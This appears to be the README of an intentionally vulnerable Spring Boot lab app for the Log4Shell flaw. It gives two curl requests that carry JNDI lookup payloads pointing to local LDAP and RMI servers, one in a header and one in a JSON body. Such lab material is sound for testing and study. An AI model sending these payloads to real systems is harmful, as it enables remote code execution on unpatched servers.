# SpringBoot-log4shell

This is a vulnerable application for log4shell vulnerability.
You can use these curl requests to test it.

> curl --location --request GET 'http://localhost:8080/requestWithHeader' \
> --header 'justaheader: ${jndi:ldap://127.0.0.1:1389/9veqmv}'


>  curl --location --request POST 'http://localhost:8080/logThis' \
>  --header 'Content-Type: application/json' \
>  --data-raw '{
>      "log":"${jndi:rmi://127.0.0.1:1099/9veqmv}"
>  }'
